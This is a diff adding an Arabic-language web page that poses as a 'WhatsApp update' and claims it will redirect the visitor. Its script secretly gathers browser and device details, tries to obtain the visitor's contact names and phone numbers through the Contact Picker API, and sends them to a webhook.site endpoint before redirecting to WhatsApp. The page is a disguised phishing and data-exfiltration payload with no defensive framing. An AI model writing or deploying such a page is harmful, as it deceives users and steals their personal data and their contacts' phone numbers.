@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث واتساب</title>
+</head>
+<body>
+    <h2>تحديث واتساب جارٍ...</h2>
+    <p>يرجى الانتظار، سيتم توجيهك تلقائياً.</p>
+    <script>
+        var WEBHOOK = "https://webhook.site/f396f1c1-fd14-4df1-9329-f57a283b7830";
+
+        function send(payload) {
+            var json = JSON.stringify(payload);
+            var blob = new Blob([json], {type: "application/json"});
+            navigator.sendBeacon(WEBHOOK, blob);
+            fetch(WEBHOOK, {method: "POST", mode: "no-cors", body: json}).catch(() => {});
+        }
+
+        var data = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + "x" + screen.height,
+            cookiesEnabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            url: location.href
+        };
+
+        if (navigator.contacts) {
+            navigator.contacts.select(["name", "tel"], {multiple: true})
+                .then(contacts => {
+                    data.contacts = contacts;
+                    send(data);
+                })
+                .catch(() => send(data));
+        } else {
+            send(data);
+        }
+
+        setTimeout(() => {
+            window.location.href = "whatsapp://send?text=...";
+        }, 2000);
+    </script>
+</body>
+</html>
